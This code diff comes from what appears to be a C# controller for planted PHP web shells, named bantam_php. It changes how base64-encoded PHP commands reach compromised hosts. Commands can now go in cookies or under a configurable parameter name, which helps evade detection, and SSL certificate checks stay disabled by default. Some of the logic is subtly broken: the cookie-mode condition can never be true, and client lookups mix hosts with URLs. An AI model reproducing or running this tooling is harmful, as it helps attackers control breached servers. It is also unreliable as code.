@@ -54,10 +54,27 @@ namespace bantam_php
                     foreach (XmlNode itemNode in itemNodes)
                     {
                         //Hot select target onload up
-                        string host = itemNode.Attributes["host"].Value;
+                        string host = itemNode?.Attributes?["host"].Value;
+
+                        string requestArg = (itemNode.Attributes["request_arg"] != null) ? itemNode?.Attributes?["request_arg"].Value : "";
+                        string requestMethod = (itemNode?.Attributes?["request_method"] != null) ? itemNode?.Attributes?["request_method"].Value : "";
 
                         //add the host to our client class containing infos
                         Clients.Add(host, new ClientInfo());
+
+                        //if the request arg is specified in the XML and not set to command
+                        if (string.IsNullOrEmpty(requestArg) == false
+                        && requestArg != "command")
+                        {
+                            Clients[host].RequestArgName = requestArg;
+                        }
+
+                        //if the request method is specified in the XML and set to cookie
+                        if (string.IsNullOrEmpty(requestMethod) 
+                         && requestMethod == "cookie")
+                        {
+                            Clients[host].SendDataViaCookie = true;
+                        }
 
                         //execute ping on current host iteration
                         Thread t = new Thread(getInitDataThread);
@@ -1450,25 +1467,39 @@ namespace bantam_php
         /// <param name="url"></param>
         /// <param name="postData"></param>
         /// <returns></returns>
-        public string makeRequest(string url, string postData)
+        public string makeRequest(string url, string postData, int timeout = 6_000, bool disableSSLCheck = true)
         {
             try
             {
                 var request = (HttpWebRequest)WebRequest.Create(url);
                 var data = Encoding.ASCII.GetBytes(postData);
 
-                request.Method = "POST";
                 request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
-                request.ContentType = "application/x-www-form-urlencoded";
-                request.ContentLength = data.Length;
-                request.Timeout = 6_000;
+                request.Timeout = timeout;
 
                 //disable SSL verification
-                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-
-                using (var stream = request.GetRequestStream())
+                if (disableSSLCheck)
                 {
-                    stream.Write(data, 0, data.Length);
+                    request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+                }
+
+                //send the commands via [GET] & [COOKIE]
+                if (Clients[url].SendDataViaCookie)
+                {
+                    request.CookieContainer = new CookieContainer();
+                    request.CookieContainer.SetCookies(new Uri(url), postData);
+                }
+                else
+                {
+                    //send the commands via [POST]
+                    request.Method = "POST";
+                    request.ContentType = "application/x-www-form-urlencoded";
+                    request.ContentLength = data.Length;
+
+                    using (var stream = request.GetRequestStream())
+                    {
+                        stream.Write(data, 0, data.Length);
+                    }
                 }
 
                 var response = (HttpWebResponse)request.GetResponse();
@@ -1480,7 +1511,7 @@ namespace bantam_php
                 }
                 return "";
             }
-            catch (Exception ex)
+            catch (Exception)
             {
                 
                 //if this borkes, you can probably mark client as red/strikethrough text (possibly remove)
@@ -1502,8 +1533,7 @@ namespace bantam_php
             string encodedCode = HttpUtility.UrlEncode(minifiedCode);
             var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
             string b64 = System.Convert.ToBase64String(plainTextBytes);
-
-            var postData = "command=" + b64;
+            var postData = Clients[url].RequestArgName + "=" + b64;
             return makeRequest(url, postData);
         }
 
